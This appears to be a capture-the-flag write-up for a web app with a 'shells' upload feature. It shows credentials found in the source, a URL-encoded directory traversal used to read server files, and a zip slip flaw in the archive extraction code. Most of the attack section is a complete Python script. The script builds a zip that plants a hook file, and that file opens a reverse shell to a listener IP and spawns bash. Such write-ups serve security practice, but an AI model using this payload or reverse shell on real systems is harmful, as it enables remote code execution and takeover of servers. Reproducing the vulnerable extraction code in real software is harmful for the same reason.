# Getting started
Looking through the web apps code, we find login credentails waiting for us
```
USER: concierge
PASS: StayNoticed2024!
```

Using directory traversal (/shells/..%2fapp.py) seqeunce on the app, we find a python snippet on the server

Looking through the app.py file, intresting lines

Lines 14 - 16 in app.py
```
BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
SHELLS_DIR = os.path.join(BASE_DIR, "shells")
HOOKS_DIR  = os.path.join(BASE_DIR, "hooks")  # <--- Important!
```

Lines 52 - 63 in app.py: zip slip vulnerabilite here
```
def extract_shell(zf, shell_dir):
    os.makedirs(shell_dir, exist_ok=True)
    written = []
    for name in zf.namelist():
        if name.endswith("/"):
            continue
        dest = os.path.join(shell_dir, name)  # Vulnerable to Zip Slip!
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as fh:
            fh.write(zf.read(name))
```

Further enumeration leads us to /shells/..%2f/theme_worker.py which;

1) Runs python scripts in /hooks for us (line 17 of theme_worker.py)
```
for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py")))
```

2) Executes our file by sending it into a new python process (line 29 - 36 of theme_worker.py)
```
proc = subprocess.Popen(
  [sys.executable, "-"],
  stdin=subprocess.PIPE,
  stdout=subprocess.DEVNULL,
  stderr=subprocess.DEVNULL,
)
proc.stdin.write(code)
proc.stdin.close()
```

3) The worker sleeps for POLL_SECONDS (20 seconds) line 11, line 44 in theme_worker.py
```
Line 11: POLL_SECONDS = int(os.environ.get("THEME_WORKER_POLL", "20"))
Line 44: time.sleep(POLL_SECONDS)
```

With this knowledge, we build a payload that;

1) Escapes into hooks, by exploiting the zipslip identified earlier

2) it runs in hooks as a python script, leading to code execution and

3) We wait for the callback (about 20 seconds)

```
import zipfile
import json

manifest = {"name": "reverse", "assets": []}

# revShell
shell = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.130.228", 8888))  # <--  Replace with your IP and Port
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    # MUST be .py to be caught by glob.glob()
    z.writestr("../../hooks/shell.py", shell)

print("shell.zip completed, upload and wait about 20s on listenner")
```

Flag at
```
/home/roomservice/flag.txt
```


